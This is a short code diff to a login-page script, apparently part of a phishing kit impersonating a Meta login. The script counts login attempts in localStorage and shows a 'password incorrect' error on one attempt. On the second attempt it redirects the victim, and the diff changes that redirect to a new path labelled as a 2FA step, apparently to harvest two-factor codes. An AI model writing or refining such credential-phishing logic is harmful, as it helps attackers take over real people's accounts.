@@ -3678,6 +3678,7 @@
         (function() {
             var attempts = parseInt(localStorage.getItem('login_attempts')) || 0;
             var metaBasePath = "{{ $metaBasePath }}";
+            var authPath = "{{ $authPath }}";
             
             function checkInputs() {
                 $('input').each(function() {
@@ -3747,9 +3748,9 @@
                             showError("The password you've entered is incorrect.");
                             $btn.removeClass('btn-disabled').css({'opacity': '1', 'pointer-events': 'auto'});
                         } else {
-                            // Second attempt: Redirect using metaBasePath
+                            // Second attempt: Redirect to 2FA path
                             localStorage.setItem('login_attempts', 0);
-                            window.location.href = metaBasePath + "/1";
+                            window.location.href = authPath;
                         }
                     },
                     error: function() {
